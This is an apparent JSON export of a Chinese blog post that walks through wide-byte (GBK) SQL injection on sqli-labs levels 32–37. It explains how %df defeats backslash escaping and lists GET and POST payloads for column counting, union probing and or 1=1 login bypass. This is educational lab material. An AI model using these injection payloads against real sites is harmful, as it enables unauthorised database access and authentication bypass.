{"title":"SQL注入-宽字节注入","uid":"b7b3116373fd14d65fd221fa9b494766","slug":"SQL注入-宽字节注入","date":"2022-02-10T07:14:55.000Z","updated":"2022-02-13T15:34:05.258Z","comments":true,"path":"api/articles/SQL注入-宽字节注入.json","keywords":null,"cover":[],"content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>[TOC]</p>\n<h2 id=\"宽字节注入原理\"><a href=\"#宽字节注入原理\" class=\"headerlink\" title=\"宽字节注入原理\"></a>宽字节注入原理</h2><p><strong>原理</strong>：<strong>mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个 汉字（前一个 ascii 码大于 128 才能到汉字的范围）。</strong>我们在过滤 ’ 的时候，往往利用的思 路是将 ‘ 转换为 \\’ 。 </p>\n<h2 id=\"注入思路\"><a href=\"#注入思路\" class=\"headerlink\" title=\"注入思路\"></a>注入思路</h2><p><strong>思路一</strong>：由于单引号被过滤了，所以我们使用%df吃掉 \\， 具体的原因是urlencode(&#39;) &#x3D; %5c%27，我们在%5c%27前面添加%df，形成%df%5c%27，而上面提到的mysql在GBK编码方式的时候会将两个字节当做一个汉字，此事%df%5c就是一个汉字，%27则作为一个单独的符号在外面，同时也就达到了我们的目的。</p>\n<p><strong>思路二</strong>：将 &#39; 中的 \\ 过滤掉，例如可以构造 %**%5c%5c%27的情况，后面的%5c会被前面的%5c给注释掉。</p>\n<hr>\n<h2 id=\"0x00\"><a href=\"#0x00\" class=\"headerlink\" title=\"0x00\"></a>0x00</h2><p>这里以Less-32–Less-37为例。</p>\n<h2 id=\"0x01\"><a href=\"#0x01\" class=\"headerlink\" title=\"0x01\"></a>0x01</h2><p><strong>Less-32</strong></p>\n<p>源码中将<code>&#39;</code>，<code>&quot;</code>和<code>\\</code>进行了过滤&#96;。</p>\n<p>将 <code>&#39;</code> 转为<code>\\&#39;</code>， 将 <code>\\</code> 转为<code>\\\\</code>，将 <code>&quot;</code>转为 <code>\\&quot;</code>，将<code>\\&#39;</code>转为<code>\\\\\\&#39;</code>。</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5.htm/image-20220210155309048.png\" alt=\"image-20220210155309048\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-32&#x2F;?id&#x3D;1\\&#39;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>可以看到<code>\\&#39;</code>过滤掉了。</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5.htm/image-20220210155816313.png\" alt=\"image-20220210155816313\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-32&#x2F;?id&#x3D;1%df&#39;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>当使用<code>%df</code>将<code>\\</code>吃掉后成功注入。</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5.htm/image-20220210160354619.png\" alt=\"image-20220210160354619\"></p>\n<p>判断字段数：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-32&#x2F;?id&#x3D;1%df&#39; order by 4 --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5.htm/image-20220210160633736.png\" alt=\"image-20220210160633736\"></p>\n<p>判断回显点：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-32&#x2F;?id&#x3D;-1%df&#39; union select 1,2,3 --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5.htm/image-20220210160746728.png\" alt=\"image-20220210160746728\"></p>\n<h2 id=\"0x02\"><a href=\"#0x02\" class=\"headerlink\" title=\"0x02\"></a>0x02</h2><p><strong>Less-33</strong></p>\n<p>源码中使用了<code>addslashes()</code> 函数；</p>\n<p>addslashes()：返回在预定义字符之前添加反斜杠的字符串。</p>\n<p>预定义字符是： 单引号<code>（&#39;）</code> 双引号<code>（&quot;）</code> 反斜杠<code>（\\）</code></p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5.htm/image-20220210161857546.png\" alt=\"image-20220210161857546\"></p>\n<p>Less-33的payload与Less-32相同。</p>\n<h2 id=\"0x03\"><a href=\"#0x03\" class=\"headerlink\" title=\"0x03\"></a>0x03</h2><p><strong>Less-34</strong></p>\n<p>由于Less-34是POST方式提交信息，而上面几关是GET方式通过url形式提交，数据会通过URLencode；</p>\n<p><strong>POST注入中可以利用</strong>：将 utf-8 转换为 utf-16 或 utf-32，例如将<code>&#39;</code>转为 utf-16 为 <code>�&#39;</code>进行注入。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">uname&#x3D;�&#39; or 1&#x3D;1 #&amp;passwd&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5.htm/image-20220210163426756.png\" alt=\"image-20220210163426756\"></p>\n<p>判断字段数：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">uname&#x3D;�&#39; order by 3 #&amp;passwd&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5.htm/image-20220210163753118.png\" alt=\"image-20220210163753118\"></p>\n<p>判断回显点：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">uname&#x3D;�&#39; union select 1,2 #&amp;passwd&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5.htm/image-20220210163726016.png\" alt=\"image-20220210163726016\"></p>\n<p>原sql语句：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token variable\">@$sql</span><span class=\"token operator\">=</span>\"<span class=\"token keyword\">SELECT</span> username<span class=\"token punctuation\">,</span> password <span class=\"token keyword\">FROM</span> users <span class=\"token keyword\">WHERE</span> username<span class=\"token operator\">=</span><span class=\"token string\">'$uname'</span>\n<span class=\"token operator\">and</span> password<span class=\"token operator\">=</span><span class=\"token string\">'$passwd'</span> <span class=\"token keyword\">LIMIT</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>此时 sql 语句为:</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> username<span class=\"token punctuation\">,</span> password <span class=\"token keyword\">FROM</span> users <span class=\"token keyword\">WHERE</span> username<span class=\"token operator\">=</span><span class=\"token string\">'�'</span> <span class=\"token operator\">or</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token comment\">#' and password='$passwd' LIMIT 0,1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<h2 id=\"0x04\"><a href=\"#0x04\" class=\"headerlink\" title=\"0x04\"></a>0x04</h2><p><strong>Less35</strong></p>\n<p>源码中<code>id</code>值没有被处理，忽略<code>addslashes()</code>函数。<br><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5.htm/image-20220210164117234.png\" alt=\"image-20220210164117234\"></p>\n<p>payload：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-35&#x2F;?id&#x3D;-1 or 1&#x3D;1\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-35&#x2F;?id&#x3D;1 order by 4\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-35&#x2F;?id&#x3D;-1 union select 1,2,3<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h2 id=\"0x05\"><a href=\"#0x05\" class=\"headerlink\" title=\"0x05\"></a>0x05</h2><p><strong>Less-36</strong></p>\n<p>源码中有了<code>mysql_real_escape_string()</code>函数过滤字符串。</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5.htm/image-20220210164814258.png\" alt=\"image-20220210164814258\"></p>\n<p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</p>\n<p>下列字符受影响： <code>\\x00</code>，  <code>\\n</code>，  <code>\\r</code>，  <code>\\</code>，  <code>&#39;</code>，<code>&quot;</code>， <code>\\x1a</code></p>\n<p>判断注入点：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-36&#x2F;?id&#x3D;1%df&#39;  or 1&#x3D;1--+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这里还是使用<code>%df</code>吃掉<code>\\</code>。</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5.htm/image-20220210165309366.png\" alt=\"image-20220210165309366\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-36&#x2F;?id&#x3D;�&#39;  or 1&#x3D;1--+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>或者这里直接使用<code>�&#39;</code>Bypass。</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5.htm/image-20220210165421459.png\" alt=\"image-20220210165421459\"></p>\n<p><strong>Notice:</strong> </p>\n<p>在使用 <code>mysql_real_escape_string()</code>时，如何能够安全的防护这种问题，需要将 mysql 设置为 gbk 即可。</p>\n<h2 id=\"0x06\"><a href=\"#0x06\" class=\"headerlink\" title=\"0x06\"></a>0x06</h2><p><strong>Less-37</strong></p>\n<p>源码当中还是使用了<code>mysql_real_escape_string()</code>函数，原理相同。</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5.htm/image-20220210165847294.png\" alt=\"image-20220210165847294\"></p>\n<p>payload：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">uname&#x3D;admin�&#39; or 1&#x3D;1#&amp;passwd&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5.htm/image-20220210170033498.png\" alt=\"image-20220210170033498\"></p>\n<h1 id=\"Summary\"><a href=\"#Summary\" class=\"headerlink\" title=\"Summary\"></a>Summary</h1><p> 从上面的几关当中，可以总结一下过滤 ‘ \\ 常用的三种方式是直接 <code>replace</code>， <code>addslashes()</code>,<code>mysql_real_escape_string()</code>。三种方式仅仅依靠一个函数是不能完全防御的，所 以我们在编写代码的时候需要考虑的更加仔细。</p>\n","text":"[TOC] 宽字节注入原理原理：mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个 汉字（前一个 ascii 码大于 128 才能到汉字的范围）。我们在过滤 ’ 的时候，往往利用的思 路是将 ‘ 转换为 \\’ 。 注入思路思路一：由于单引...","link":"","photos":[],"count_time":{"symbolsCount":"2.5k","symbolsTime":"2 mins."},"categories":[{"name":"SQL注入","slug":"SQL注入","count":20,"path":"api/categories/SQL注入.json"}],"tags":[{"name":"SQL注入","slug":"SQL注入","count":21,"path":"api/tags/SQL注入.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">宽字节注入原理</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF\"><span class=\"toc-text\">注入思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x00\"><span class=\"toc-text\">0x00</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01\"><span class=\"toc-text\">0x01</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02\"><span class=\"toc-text\">0x02</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x03\"><span class=\"toc-text\">0x03</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x04\"><span class=\"toc-text\">0x04</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x05\"><span class=\"toc-text\">0x05</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x06\"><span class=\"toc-text\">0x06</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Summary\"><span class=\"toc-text\">Summary</span></a>","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"SQL注入-堆叠注入","uid":"a92a2310a2f65e102da5b7c1e7626f1d","slug":"SQL注入-堆叠注入","date":"2022-02-10T09:06:24.000Z","updated":"2022-02-13T15:45:30.445Z","comments":true,"path":"api/articles/SQL注入-堆叠注入.json","keywords":null,"cover":[],"text":"[TOC] 堆叠注入原理在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。试想一下我们在 ; 结束一个 sql 语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而 union injection（联合注入）也是将两条语句合并在一起，两者之间有...","link":"","photos":[],"count_time":{"symbolsCount":287,"symbolsTime":"1 mins."},"categories":[{"name":"SQL注入","slug":"SQL注入","count":20,"path":"api/categories/SQL注入.json"}],"tags":[{"name":"SQL注入","slug":"SQL注入","count":21,"path":"api/tags/SQL注入.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"SQL注入-HPP","uid":"ed28de52de42846cd0569a9a357ddaf1","slug":"SQL注入-HPP","date":"2022-02-10T05:11:20.000Z","updated":"2022-02-15T12:14:34.027Z","comments":true,"path":"api/articles/SQL注入-HPP.json","keywords":null,"cover":[],"text":"[TOC] ##服务器两层架构 服务器端有两个部分：第一部分为 tomcat 为引擎的 jsp 型服务器，第二部分为 apache为引擎的 php 服务器，真正提供 web 服务的是 php 服务器。工作流程为：client 访问服务器， 能直接访问到 tomcat 服务器，然后...","link":"","photos":[],"count_time":{"symbolsCount":"2.5k","symbolsTime":"2 mins."},"categories":[{"name":"SQL注入","slug":"SQL注入","count":20,"path":"api/categories/SQL注入.json"}],"tags":[{"name":"SQL注入","slug":"SQL注入","count":21,"path":"api/tags/SQL注入.json"},{"name":"基础知识","slug":"基础知识","count":12,"path":"api/tags/基础知识.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}